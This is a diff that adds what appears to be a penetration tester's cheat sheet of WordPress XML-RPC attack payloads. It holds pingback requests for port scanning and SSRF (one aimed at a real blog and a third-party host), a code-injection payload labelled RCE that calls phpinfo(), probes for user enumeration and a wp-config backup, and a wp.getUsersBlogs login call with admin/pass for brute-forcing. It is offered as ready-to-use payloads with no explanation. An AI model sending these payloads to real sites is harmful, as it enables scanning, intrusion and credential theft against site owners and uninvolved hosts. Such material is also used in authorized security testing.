@@ -1,0 +1,55 @@
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+<!!!PingBack___!!!>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param><value><string>http://<YOUR SERVER >:<port></string></value></param>
+<param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string></value></param></params>
+</methodCall>
+
+////Wordpress Pingback Port Scanner | Firefart////
+
+########   RCE   ############
+<?xml version="1.0"?> 
+<methodCall> 
+<methodName>test.method</methodName> 
+<params> 
+<param> 
+<value><name>','')); phpinfo(); exit;/*</name></value> 
+</param> 
+</params> 
+</methodCall> 
+
+wp-json/wp/v2/users
+wp/xmlrpc.php
+wp-config.php-bak
+
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param><value><string>https://www.bing.com:777</string></value></param>
+<param><value><string>https://www.figo.io/blog/bankathon-7-prague-diamond-partner-deloitte/</string></value></param>
+</params>
+</methodCall>
+
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string></value>
+</param></params>
+</methodCall>
